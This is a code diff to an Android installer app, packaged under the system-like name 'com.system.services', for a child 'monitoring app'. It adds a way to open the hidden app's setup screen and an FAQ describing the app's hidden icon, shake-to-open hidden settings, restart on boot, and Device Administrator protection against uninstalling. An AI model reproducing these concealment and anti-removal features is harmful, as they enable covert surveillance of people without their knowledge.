@@ -2,6 +2,7 @@ package com.system.services
 
 import android.app.PendingIntent
 import android.content.BroadcastReceiver
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
@@ -257,7 +258,17 @@ class MainActivity : AppCompatActivity() {
         btnRetry.setOnClickListener { showStep(STEP_WELCOME) }
 
         btnOpenApp.setOnClickListener {
-            packageManager.getLaunchIntentForPackage(TARGET_PKG)?.let { startActivity(it) }
+            // FIX: launch the child app's setup activity directly if no launcher icon exists
+            val launchIntent = packageManager.getLaunchIntentForPackage(TARGET_PKG)
+                ?: Intent().apply {
+                    component = ComponentName(TARGET_PKG, "$TARGET_PKG.setup.SetupActivity")
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+            try {
+                startActivity(launchIntent)
+            } catch (_: Exception) {
+                Toast.makeText(this, "Could not open the monitoring app", Toast.LENGTH_SHORT).show()
+            }
         }
 
         btnDeleteInstaller.setOnClickListener {
@@ -267,6 +278,52 @@ class MainActivity : AppCompatActivity() {
                 }
             )
             finish()
+        }
+
+        // FAQ section — toggle visibility
+        val btnFaq    = findViewById<Button>(R.id.btnFaq)
+        val panelFaq  = findViewById<View>(R.id.panelFaq)
+        btnFaq?.setOnClickListener {
+            if (panelFaq?.visibility == View.VISIBLE) {
+                panelFaq.visibility = View.GONE
+                btnFaq.text = "❓ FAQ"
+            } else {
+                panelFaq?.visibility = View.VISIBLE
+                btnFaq.text = "✕ Close FAQ"
+            }
+        }
+
+        val faqItems = listOf(
+            "Why is the icon hidden?" to
+                "The monitoring app hides its icon so children cannot easily find and uninstall it. You can re-enable the icon from within the app's hidden settings.",
+            "How do I open the monitoring app after setup?" to
+                "Tap 'Open Child App' on this screen. You can also shake the child's phone 5 times to open the hidden settings.",
+            "Will this app slow down the phone?" to
+                "No. The monitoring service is optimized for minimal battery and CPU usage. Most parents see less than 2% extra battery drain.",
+            "What happens if the child restarts the phone?" to
+                "The monitoring service automatically restarts on boot. Make sure 'Autostart' is enabled in the phone's battery/app settings for best results.",
+            "Can the child uninstall the monitoring app?" to
+                "Device Administrator protection makes it very difficult. You can also set an uninstall password from the app's hidden settings."
+        )
+
+        val llFaq = panelFaq?.findViewById<LinearLayout>(R.id.llFaqItems)
+        llFaq?.removeAllViews()
+        faqItems.forEach { (q, a) ->
+            val qv = TextView(this).apply {
+                text = "Q: $q"
+                textSize = 14f
+                setTypeface(null, android.graphics.Typeface.BOLD)
+                setPadding(0, 24, 0, 4)
+                setTextColor(0xFF212121.toInt())
+            }
+            val av = TextView(this).apply {
+                text = a
+                textSize = 13f
+                setPadding(0, 0, 0, 8)
+                setTextColor(0xFF616161.toInt())
+            }
+            llFaq?.addView(qv)
+            llFaq?.addView(av)
         }
     }
 
